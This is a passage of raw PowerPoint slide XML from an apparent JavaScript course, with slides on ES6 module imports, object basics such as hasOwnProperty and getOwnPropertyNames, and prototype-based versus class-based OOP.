                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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inchConversion</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12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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3A2CAAC-5CAE-43D8-82AF-75B8F88C75B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Using ES6+ Module Imports</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A888211E-AD9E-4F2F-AFBB-D2CA7C9B20DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4997152"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</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html</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt;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head</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meta</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charset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"utf-8"</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title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>title</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meta</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name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viewport</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content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width</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device-width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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initial-scale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1"</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head</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&lt;!-- NOTE: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>You</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must</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use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type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>module</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" --&gt;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type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module</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import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inchesToCm</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cmToInches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>from</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'./util3.js'</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inchesToCm</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12</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import</a:t>
            </a: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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>as</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Util</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>from</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'./util3.js'</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Util</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inchesToCm</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12</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&lt;!-- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Fallback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>older</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browsers</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use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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8000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>script</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nomodule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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="fallback.js"&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; --&gt;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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38863418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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF23E883-CE6C-4222-B069-19D1A272D751}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>JavaScript Objects</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{513C6930-FFA3-41D9-B309-718138326BBB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Can be used like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Python dictionaries</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>defining:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var empty = {}; // empty object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new_object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = new Object();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var obj = {"key1": value1, "key2": value2};</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>assigning values:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>obj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>["key"] = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new_value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>you can access object properties, which follow JavaScript object property name rules:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>obj.age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = 25;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// but e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>obj.street</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> address = "Road 15" doesn't work</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>checking if object has certain property/key, which is not inherited:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>obj.hasOwnProperty</a:t>
            </a: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propertyName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>propertyName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" in object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Finding all properties, except those which use Symbol</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object.getOwnPropertyNames</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(obj) // returns an array of properties</a:t>
            </a:r>
            <a:endParaRPr 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405BC7D6-2C87-433B-A8C5-7EFE1FEB30D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Prototype-Based</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Object-Oriented Programming (OOP)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104451" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34DF438B-5F35-41DE-A703-B2C0055827EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1772816"/>
            <a:ext cx="10972800" cy="4525963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>JavaScript has prototype-based OOP language, instead of class-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Everything is an object, except built-in types (Number, String, Boolean, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, Symbol, null and undefined) and even those types benefit from automatic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>coersions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> to objects to behave like objects.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Classes are defined using a function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> refers to an object itself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Prototype allows to extend and modify objects even after they have been created.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>ES6 introduced class, constructor etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Lacks private and protected. Everything is public by default!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Very flexible, but requires new kind of thinking</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3CE0AEC-5357-4A29-B46D-D9B16BA4FD6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prototype Vs Class-Based OOP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{99BCA270-59A6-4A06-B9D9-C3EC66E9E784}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prototypes assume world is evolving fast and things what we have now are not final, but prototypes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>There is no class, but everything is an object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inheriting just one prototype chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>More powerful and rarely understood.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Sisällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4A8BF33-1995-404F-847E-F6C96CF2217D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
